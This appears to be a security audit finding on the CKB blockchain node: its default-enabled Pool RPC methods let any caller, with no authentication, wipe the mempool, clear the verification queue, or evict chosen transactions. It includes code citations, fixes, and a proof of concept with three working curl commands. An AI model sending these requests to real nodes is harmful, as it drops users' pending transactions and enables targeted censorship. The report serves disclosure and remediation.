### Title
Unauthenticated Destructive RPC Operations Allow Any Caller to Wipe the Transaction Pool — (`rpc/src/module/pool.rs`)

---

### Summary

The CKB JSON-RPC `Pool` module exposes `clear_tx_pool`, `clear_tx_verify_queue`, and `remove_transaction` as public, unauthenticated endpoints with no caller identity check or access control of any kind. The `Pool` module is enabled by default in the production node configuration. Any process or client that can reach the RPC port — including any local process on the same machine — can invoke these methods to instantly wipe all pending transactions from the mempool or selectively evict individual transactions, with no credentials required.

---

### Finding Description

**Root cause:** The CKB RPC server has no authentication layer. Module-level gating (enabled/disabled via config) is the only access control mechanism. Within an enabled module, every registered method is callable by any HTTP client that can reach the listening address.

The `Pool` module is enabled by default: [1](#0-0) 

The trait exposes `clear_tx_pool` and `clear_tx_verify_queue` as plain public RPC methods: [2](#0-1) 

Their implementations perform the destructive operation immediately with no caller check: [3](#0-2) 

`remove_transaction` similarly allows any caller to evict a specific transaction by hash: [4](#0-3) 

The underlying `TxPoolController::clear_pool` and `clear_verify_queue` are unconditional: [5](#0-4) 

The `ServiceBuilder` mounts all Pool methods as a flat group — there is no per-method access modifier, no token, no IP allowlist, and no role check inside the handler: [6](#0-5) 

**Exploit flow:**

1. Attacker identifies a CKB node with the RPC port reachable (default `127.0.0.1:8114`; operators frequently expose this to `0.0.0.0` for remote mining or monitoring).
2. Attacker sends a single HTTP POST:
   ```json
   {"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}
   ```
3. The node immediately calls `tx_pool.clear_pool(snapshot)`, atomically removing every pending and proposed transaction from the mempool.
4. No signature, token, or privileged key is required.

---

### Impact Explanation

- **Transaction pool wipe (DoS):** All pending user transactions are silently dropped. Users must detect the loss and resubmit. Miners lose all queued fee revenue for the current block window.
- **Selective censorship via `remove_transaction`:** An attacker can target specific high-value or time-sensitive transactions (e.g., DAO withdrawals, RBF replacements) and evict them repeatedly, preventing confirmation.
- **Verification queue disruption via `clear_tx_verify_queue`:** Transactions awaiting script verification are discarded, stalling throughput without touching the main pool, making the attack harder to detect.

These operations cause **service unavailability and severe degradation** — a stated high-severity impact category.

---

### Likelihood Explanation

- The `Pool` module is on by default in every production `ckb.toml`.
- Many node operators expose the RPC beyond localhost for remote miner connectivity or monitoring dashboards. The config file itself warns against this but provides no enforcement mechanism.
- Any co-located process (e.g., a compromised dependency, a malicious script in the same environment) can reach `127.0.0.1:8114` without any network privilege.
- The attack requires a single HTTP request with no credentials.

---

### Recommendation

1. Add an **authentication token** (e.g., a bearer token or HMAC-signed header) to the RPC server, required for all state-mutating methods.
2. Introduce **per-method access tiers** (read-only vs. admin) enforced at the `ServiceBuilder` or middleware layer, so destructive methods like `clear_tx_pool`, `clear_tx_verify_queue`, and `remove_transaction` require an elevated credential even when the `Pool` module is enabled.
3. At minimum, bind mutating endpoints to a separate, non-default listen address so operators must explicitly opt in to exposing them.

---

### Proof of Concept

```bash
# Wipe the entire mempool of a default CKB node — no credentials needed
curl -s -X POST http://127.0.0.1:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}'
# Response: {"jsonrpc":"2.0","result":null,"id":1}

# Evict a specific transaction by hash
curl -s -X POST http://127.0.0.1:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction","params":["0x<tx_hash>"],"id":2}'

# Clear the verification queue (stalls incoming tx processing)
curl -s -X POST http://127.0.0.1:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_verify_queue","params":[],"id":3}'
```

All three calls succeed on any node with the `Pool` module enabled (the default) and the RPC port reachable, with no authentication whatsoever. [3](#0-2) [2](#0-1) [7](#0-6)

### Citations

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-700)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }

    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
```

**File:** tx-pool/src/service.rs (L370-378)
```rust
    /// Clears the tx-pool, removing all txs, update snapshot.
    pub fn clear_pool(&self, new_snapshot: Arc<Snapshot>) -> Result<(), AnyError> {
        send_message!(self, ClearPool, new_snapshot)
    }

    /// Clears the tx-verify-queue.
    pub fn clear_verify_queue(&self) -> Result<(), AnyError> {
        send_message!(self, ClearVerifyQueue, ())
    }
```

**File:** rpc/src/service_builder.rs (L64-77)
```rust
    /// Mounts methods from module Pool if it is enabled in the config.
    pub fn enable_pool(
        mut self,
        shared: Shared,
        extra_well_known_lock_scripts: Vec<Script>,
        extra_well_known_type_scripts: Vec<Script>,
    ) -> Self {
        let methods = PoolRpcImpl::new(
            shared,
            extra_well_known_lock_scripts,
            extra_well_known_type_scripts,
        );
        set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
    }
```
